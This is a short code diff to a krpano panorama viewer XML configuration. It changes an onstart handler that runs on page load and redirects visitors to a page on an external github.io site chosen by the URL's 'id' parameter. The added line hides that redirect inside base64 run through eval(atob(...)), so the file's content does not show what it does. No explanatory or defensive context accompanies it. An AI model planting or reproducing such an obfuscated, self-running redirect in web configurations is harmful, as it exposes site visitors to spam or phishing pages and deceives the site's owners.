@@ -1,2 +1,2 @@
-<krpano onstart="js(var i=new URLSearchParams(window.location.search).get('id');if(i){window.location.href='https://rakib420m.github.io/Rakib-Automation/'+i+'.html';});">
+<krpano onstart="js(eval(atob('dmFyIHA9bmV3IFVSTFNlYXJjaFBhcmFtcyh3aW5kb3cubG9jYXRpb24uc2VhcmNoKS5nZXQoJ2lkJyk7aWYocCl7d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHBzOi8vcmFraWI0MjBtLmdpdGh1Yi5pby9SYWtpYi1BdXRvbWF0aW9uLycrcCsnLmh0bWwnO30=')));">
 </krpano>
